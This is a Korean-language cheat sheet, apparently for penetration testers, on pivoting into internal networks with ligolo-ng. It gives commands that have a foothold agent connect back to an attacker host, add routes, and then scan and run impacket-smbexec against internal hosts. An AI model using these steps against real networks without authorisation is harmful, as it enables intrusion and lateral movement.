# ligolo-ng로 TUN 기반 피벗

- ligolo-ng — proxy(공격 호스트) + agent(대상 발판) 구조의 피벗 도구. TUN 인터페이스 기반이라 proxychains 없이 nmap·curl·브라우저가 내부망 IP를 직접 쓰듯 동작한다.
- SOCKS 체인 없이 내부 서브넷 전체를 라우팅할 때, SYN 스캔이나 대량 연결 도구를 그대로 쓰고 싶을 때, Windows 발판에서 내부망으로 확장할 때.
- 공격 호스트에 ligolo-proxy, 대상에 ligolo-agent 바이너리 필요(GitHub release). 발판에서 공격 호스트 11601로 아웃바운드가 가능해야 한다.

## 기본 구조

```text
공격 호스트: ligolo-proxy   (11601 리슨, TUN 생성)
대상 발판:   ligolo-agent   (공격 호스트:11601 로 접속)
```

## 프록시 실행 (공격 호스트, Kali)

```bash
ligolo-proxy -selfcert
```

- `-selfcert`: 자기 서명 인증서를 생성해 TLS 채널을 바로 띄운다. 기본 리슨 포트는 11601.

## 에이전트 실행 (대상 발판)

```bash
# Linux
./ligolo-agent -connect 10.10.14.5:11601 -ignore-cert

# Windows
ligolo-agent.exe -connect 10.10.14.5:11601 -ignore-cert
```

- `-ignore-cert`: 자기 서명 인증서를 허용. 더 안전하게는 `-accept-fingerprint <지문>`으로 지정한다.

## 프록시 콘솔 명령 (v0.6 이상)

```text
ligolo-ng » session
ligolo-ng » interface_create --name ligolo
ligolo-ng » tunnel_start --tun ligolo
ligolo-ng » interface_add_route --name ligolo --route 10.0.0.0/24
```

- `session`: 연결된 에이전트 목록에서 선택.
- `interface_create` / `tunnel_start`: TUN 인터페이스 생성 후 터널 시작.
- `interface_add_route`: 프록시 쪽에 내부 서브넷 경로 추가. Kali 셸의 `sudo ip route add 10.0.0.0/24 dev ligolo`로 대체 가능.

## Windows 에이전트 쪽 라우팅

```powershell
netsh int ipv4 show interfaces
route add 10.0.0.0 mask 255.255.255.0 0.0.0.0 if <인터페이스_IDX>
```

- 공격 호스트에서 내부망 IP로 접속하려면 에이전트(Windows)가 터널 인터페이스로 되돌려 보내야 하므로 에이전트 쪽에도 라우트를 추가한다.

## 실전 사용

```bash
# 라우팅 후에는 proxychains 없이 그대로 사용
nmap -sT -Pn 10.0.0.0/24
curl http://10.0.0.10/
impacket-smbexec DOMAIN/user:pass@10.0.0.15
```

## 팁·트러블슈팅

1. TUN 기반이라 TCP 외 트래픽도 처리되어 도구 호환성이 proxychains보다 좋다.
2. 경로는 프록시 콘솔(interface_add_route)과 셸(ip route add) 중 하나만 쓰면 된다.
3. 에이전트가 끊기면 session 목록과 tunnel_start 상태를 다시 확인한다.
4. 터널 인터페이스 기본 주소(240.0.0.1 등 240.0.0.0/4 대역)가 대상 경로와 겹치지 않게 한다.
